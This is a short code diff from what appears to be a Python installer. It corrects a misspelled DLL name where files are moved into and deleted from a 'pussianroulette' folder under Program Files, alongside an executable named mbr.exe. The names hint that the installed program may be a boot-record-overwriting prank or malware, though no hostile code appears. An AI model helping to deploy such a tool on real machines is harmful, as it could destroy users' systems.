@@ -63,7 +63,7 @@ def x():
 	os.remove("C:/Program Files/pussianroulette/mbr.exe")
 	os.remove("C:/Program Files/pussianroulette/api-ms-win-core-path-l1-1-0.dll")
 	os.remove("C:/Program Files/pussianroulette/msvcp140d.dll")
-	os.remove("C:/Program Files/pussianroulette/urctbased.dll")
+	os.remove("C:/Program Files/pussianroulette/ucrtbased.dll")
 	os.remove("C:/Program Files/pussianroulette/vcruntime140_1d.dll")
 	os.rmdir("C:/Program Files/pussianroulette/")
 
@@ -71,7 +71,7 @@ os.mkdir("C:/Program Files/pussianroulette")
 shutil.move("temp/mbr.exe", "C:/Program Files/pussianroulette")
 shutil.move("temp/api-ms-win-core-path-l1-1-0.dll", "C:/Program Files/pussianroulette")
 shutil.move("temp/msvcp140d.dll", "C:/Program Files/pussianroulette")
-shutil.move("temp/urctbased.dll", "C:/Program Files/pussianroulette")
+shutil.move("temp/ucrtbased.dll", "C:/Program Files/pussianroulette")
 shutil.move("temp/vcruntime140_1d.dll", "C:/Program Files/pussianroulette")
 os.rmdir("temp")
 
